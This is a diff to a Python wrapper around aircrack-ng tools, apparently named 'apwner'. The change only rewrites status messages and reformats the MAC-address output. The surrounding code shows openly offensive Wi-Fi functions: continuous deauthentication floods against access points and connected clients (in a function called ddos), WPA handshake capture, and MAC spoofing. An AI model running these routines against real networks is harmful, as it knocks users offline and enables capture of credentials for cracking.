@@ -10,25 +10,25 @@ from prettytable import PrettyTable
 from mods.colors import *
 
 def aireplay():
-    print(color.BLUE+"[+] Deauthenticating "+bssid+" on channel "+channel+"..."+color.END)
+    print(color.BLUE+"[~] Deauthenticating "+bssid+" on channel "+channel+"..."+color.END)
     subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, interface])
 
 def check_kill():
-    print(color.BLUE+"[+] Killing conflicting processes..."+color.END)
+    print(color.BLUE+"[~] Killing conflicting processes..."+color.END)
     subprocess.run(['airmon-ng', 'check' ,'kill'], capture_output=True).stdout.decode()
 
 def NetworkManager():
-    print(color.BLUE+"[+] Restarting conflicting processes..."+color.END)
+    print(color.BLUE+"[~] Restarting conflicting processes..."+color.END)
     subprocess.run(['systemctl', 'start', 'NetworkManager'])
 
 def airodump():
-    print(color.BLUE+"[+] Scanning for Access Points..."+color.END)
+    print(color.BLUE+"[~] Scanning for Access Points..."+color.END)
     dump_path = os.path.join('/tmp','apwner_dumps')
     os.makedirs(dump_path, exist_ok = True)
     subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '-w' , '/tmp/apwner_dumps/dump', '--output-format', 'csv', interface])
     
 def airmon():
-    print(color.BLUE+"\n[+] Enabling Monitor mode on "+str(interface)+"..."+color.END)
+    print(color.BLUE+"\n[~] Enabling Monitor mode on "+str(interface)+"..."+color.END)
     cmd = subprocess.run(['airmon-ng', 'start', interface, channel], capture_output=True).stdout.decode()
     print(cmd)
     
@@ -39,30 +39,26 @@ def handshake():
         subprocess.run(['xterm', '-geometry', '110x24-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w' , handshake_path+'/'+essid+'_'+bssid, interface])
         
 def change_mac():
-    print(color.BLUE+"[+] Bringing interface "+str(interface)+" down..."+color.END)
+    print(color.BLUE+"[~] Changing MAC address..."+color.END)
     subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
-    print(color.BLUE+"[+] Changing MAC address..."+color.END)
     cmd = subprocess.run(['macchanger', '-A' , interface], capture_output=True).stdout.decode()
     for line in cmd.strip().splitlines():
-        print(" "*4+color.YELLOW+line+color.END)
-    print(color.BLUE+"[+] Bringing interface "+str(interface)+" up..."+color.END)
+        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
 
 def reset_mac():
-    print(color.BLUE+"[+] Bringing interface "+str(interface)+" down..."+color.END)
+    print(color.BLUE+"[~] Restoring MAC address..."+color.END)
     subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
-    print(color.BLUE+"[+] Restoring MAC address..."+color.END)
     cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
     for line in cmd.strip().splitlines():
-        print(" "*4+color.YELLOW+line+color.END)
-    print(color.BLUE+"[+] Bringing interface "+str(interface)+" up..."+color.END)
+        print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
     
 def aireplay_s(st_input):
     subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', station_dict[int(st_input)], interface])
     
 def get_interface():
-    print(color.BLUE+"[+] Scanning for interfaces..."+color.END)
+    print(color.BLUE+"[~] Scanning for interfaces..."+color.END)
     global interface, i
     i = 1
     int_dict = {}
@@ -196,7 +192,7 @@ def read_dump_s():
     global s, station_ch, station_dict
     station_dict = {0:"All"}
     s = 0
-    print(color.BLUE+"[+] Scanning for stations on "+ bssid+"..."+color.END)
+    print(color.BLUE+"[~] Scanning for stations on "+ bssid+"..."+color.END)
     subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-w' , '/tmp/apwner_dumps/'+bssid, '--output-format', 'csv', '-c', channel, interface])
     nwst_file = max(glob.glob('/tmp/apwner_dumps/*.csv'), key=os.path.getctime)
     with open(nwst_file, 'r') as csvfile:
@@ -262,7 +258,7 @@ def ddos():
     else:
         run = True
         for x in station_ch.split():
-            print(color.BLUE+"[+] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
+            print(color.BLUE+"[~] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
         for x in station_ch.split():
             t = threading.Thread(target=aireplay_s, args=(x,))
             threads.append(t)
